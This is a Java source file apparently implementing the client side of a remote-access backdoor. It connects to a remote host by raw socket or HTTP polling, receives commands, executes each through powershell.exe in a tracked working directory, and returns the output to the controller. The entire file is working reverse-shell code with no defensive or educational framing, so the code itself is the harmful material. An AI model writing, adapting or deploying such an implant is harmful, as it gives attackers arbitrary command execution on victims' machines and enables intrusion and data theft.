package org.fun;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.Socket;

public class Client extends Thread{
    private Socket socket;
    private Runtime process;
    private String directory = System.getProperty("user.dir");
    private DataInputStream input;
    private DataOutputStream output;
    private WebHTTP webHTTP;
    public Client(String address, int port) throws IOException{
        socket = new Socket(address, port);
        input = new DataInputStream(socket.getInputStream());
        output = new DataOutputStream((socket.getOutputStream()));
        process = Runtime.getRuntime();
    }
    public Client(String url) {
        process = Runtime.getRuntime();
        webHTTP = new WebHTTP(0, url);
    }
    private String runCommand(String commands) throws IOException {
//        Process subProcess = process.exec("cmd /c " + commands);
        Process subProcess = process.exec("powershell.exe cd " + directory + ";" + commands);
        String message = "";
        BufferedReader br = new BufferedReader(new InputStreamReader(
                subProcess.getInputStream()));
        String line;
        while ((line = br.readLine()) != null) {
            message += line + "\n";
            if (line.strip().startsWith("Directory: ") && commands.startsWith("cd")) {
                directory = line.strip().substring("Directory:".length(), line.strip().length());
            }
        }
        br.close();
        return message;
    }
    private String runMessage(String message) throws IOException {
        return runCommand(message);
    }
    private void sendMessage(String message) throws IOException {
        output.writeChars(message + "`");
    }
    public void webCommunicationLoop() throws IOException, InterruptedException {
        String message;
        String out;
        int messageSent;
        int[] result = new int[2];
        result[1] = 0;
        while (true) {
            Thread.sleep(10);
            message = webHTTP.httpGet(result);
            if (result[0] > result[1]) {
                result[1] = result[0];
                out = runMessage(message.substring(Integer.toString(result[1]).length(), message.length()));
                while (true) {
                    messageSent = webHTTP.httpPost(out);
                    if (messageSent == HttpURLConnection.HTTP_OK)
                        break;
                }
            }
        }
    }
    public void communicationLoop() throws IOException {
        String message = "";
        String out;
        boolean toggle = false;
        char charToAdd;
        while (true) {
            if (input.available() > 0) {
                while (input.available() > 0) {
                    charToAdd = input.readChar();
                    if (charToAdd == '`') {
                        toggle = true;
                        break;
                    }
                    message += charToAdd;
                }
                if (toggle) {
                    toggle = false;
                    out = runMessage(message);
                    if (out != null)
                        sendMessage(out);
                    message = "";
                }
            }
        }
    }
}
